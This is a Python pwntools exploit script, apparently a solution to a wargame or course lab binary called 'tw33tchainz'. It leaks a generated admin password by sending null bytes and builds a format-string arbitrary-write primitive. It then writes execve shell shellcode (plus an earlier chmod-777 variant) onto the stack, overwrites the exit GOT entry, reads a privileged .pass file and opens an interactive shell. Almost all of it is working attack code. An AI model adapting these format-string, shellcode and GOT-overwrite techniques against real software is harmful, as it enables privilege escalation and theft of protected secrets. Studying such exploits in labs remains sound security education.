
'''
1. There is a hidden debug menu within the program. 
   In order to reach this, we need to find a password. 

   This password can be taken by passing all \x00's to both the salt and the username because this will give off the secret and randomly generated password. 

'''

from pwn import *
import os

# Move the location of the execution 
os.chdir("/home/project1_priv") 

'''
Convert password from hex string to byte. 
The string needs to be changed every four bytes in order ot fix the endianness. 
'''
def hex_to_string(password): 
    new_four = ""
    new_pass = ""
    for index in range(0,len(password),2):
        
        # Every four bytes (8 characters) change the endianness of the byte. 
        if(index % 8 == 0): 
            new_four = new_four[::-1]
            new_pass += new_four
            new_four = ""

        ch1 = password[index]
        ch2 = password[index+1]
        char = (ch1+ch2).decode("hex") 
        new_four += char
        #new_pass += char

    # Missed a single flip, need to do this again
    new_four = new_four[::-1] 
    new_pass += new_four 
    return new_pass

# A write primative to write ANYWHERE in the program that we want to write to
# The location is the address to write to. 
# The value is the WHAT to be written
# This works one byte at a time
def write_value(location, value): 
    offset = 0x5

    # This wraps around the write and does not need to worry about too much data. 
    value += 256
    string = 'J' + location + '%' # 'Jbbbb' 
    string += str(value - offset) # The value to write
    string += 'x%8$hhn' # The direct parameter to access
    print string
    return string 

# Hex value to bytes, in the same endian format
def hex_to_bytes(value): 
    return str(value).decode('hex')[::-1]

def write_shellcode(p): 
    '''
    The shellcode being written. This is done, in programmatic order, by the byte_array below.
    Asm for chmoding the .pass file 
    31 c0               xor eax, eax 
    31 db               xor ebx, ebx
    31 c9               xor ecx, ecx
    b0 0f               mov 0xf, al 
    6a 73               push 0x73
    68 2e 70 61 73      push 0x7361702e
    89 e3               mov ebx, esp
    66 b9 ff 01         mov 777o, cx
    cd 80               int 0x80
    31 c0               xor eax, eax 
    b0 01               mov 0x1, al 
    cd 80               int 0x80
    '''
    stack_val = 0xbffdf026
    index = stack_val
    byte_array = [0x31, 0xc0, 0x31, 0xdb, 0x31, 0xc9, 0xb0,0xf, 0x6a, 0x73, 0x68, 0x2e, 0x70, 0x61, 0x73, 0x89, 0xe3, 0x66, 0xb9, 0xff, 0x01, 0xcd, 0x80, 0x31,0xc0,0xb0,0x01,0xcd, 0x80]

    byte_array = [0x31, 0xc0, 0x31, 0xc9, 0x31, 0xd2, 0x50, 0x68, 0x6e, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x2f, 0x62, 0x69, 0x89,0xe3, 0xb0, 0x0b, 0xcd, 0x80]
    for byte in byte_array: 

        # Sends the write command
        p.sendline('1') 
        altered_string = str(hex(stack_val))[2:-1] # Rearranges a hex int into a useable format
        
        # Converts the hex string in a byte address
        addr = hex_to_bytes(str(hex(stack_val))[2:]) 
        
        # The write itself
        p.sendline(write_value(addr,byte))
        p.sendline('') # Eats the missing char
        stack_val += 1
    return 

def overwrite_return(p): 
    '''
    Overwriting the value of the exit function in the PLT/GOT table. 
    NOTE: The parsing from hex int to string is different because this conversion leads to an integer, instead of a long (L) at the end. 

    '''
    stack_val = 0x0804d03c
    byte_array = [0x01,0xf0,0xfd,0xbf]
    # 0x08049408
    #byte_array = [0x08, 0x94,0x04,0x08]
    for byte in byte_array: 

        # Sends the write command
        p.sendline('1') 
        altered_string = '0' + str(hex(stack_val))[2:] # Rearranges a hex int into a useable format
        # Converts the hex string in a byte address
        addr = hex_to_bytes('0' + str(hex(stack_val))[2:]) 
        # The write itself
        p.sendline(write_value(addr,byte))
        p.sendline('') # Eats the missing char
        stack_val += 1
    return 

# Gets admin on the binary
def get_admin_debug(p): 
    # Add all null bytes to the username and salt. 
    p.send("\x00" * 32) 

    # Grab the leaked password then reorganize it. 
    p.recvuntil('Generated Password', drop=True)
    p.recvline()
    password = p.recvline()
    password = password.replace(' ','').replace('\n','')
    password = hex_to_string(password)
    p.recvline() 

    # Send the admin password
    p.sendline('3')
    p.sendline('3')
    p.sendline('3')
    p.sendline(password)

    # Turn on debug mode
    p.recvuntil('Enter Choice:') 
    p.sendline('6')
    p.sendline('6')
    return True


print "Process ID", os.getpid()
p = process("/levels/project1/tw33tchainz")

get_admin_debug(p)
'''
# Add all null bytes to the username and salt. 
p.send("\x00" * 32) 

# Grab the leaked password then reorganize it. 
p.recvuntil('Generated Password', drop=True)
p.recvline()
password = p.recvline()
password = password.replace(' ','').replace('\n','')
password = hex_to_string(password)
p.recvline() 

# Send the admin password
p.sendline('3')
p.sendline('3')
p.sendline('3')
p.sendline(password)

# Turn on debug mode
p.recvuntil('Enter Choice:') 
p.sendline('6')
p.sendline('6')
'''

# Write .pass to the first twitter location. This will be used in the chmod later
# This works because the location of the execution has already been changed
p.recvuntil('Enter Choice:') 
p.sendline('1') 
p.sendline('.pass') 
p.sendline('') # Get past the eaten char

# Write the important shellcode
write_shellcode(p) 
p.sendline('2') 
overwrite_return(p)
p.sendline('2') 
p.sendline('2') 
# Use this to write to any location
#p.sendline('J\x08\xe0\x04\x08%10x%8$n')
p.sendline('5')
p.sendline('cat /home/project1_priv/.pass') 
'''
p.sendline('1') 
p.sendline('1') 
p.sendline(write_value("\x08\xe0\x04\x08", 0x4))
p.sendline('') 
p.sendline('2') 

p.sendline(write_value("\x09\xe0\x04\x08", 0x4))
#p.sendline('2') 
#p.recvuntil('Turn debug mode off')
#p.sendline('2') 
'''
p.interactive() 


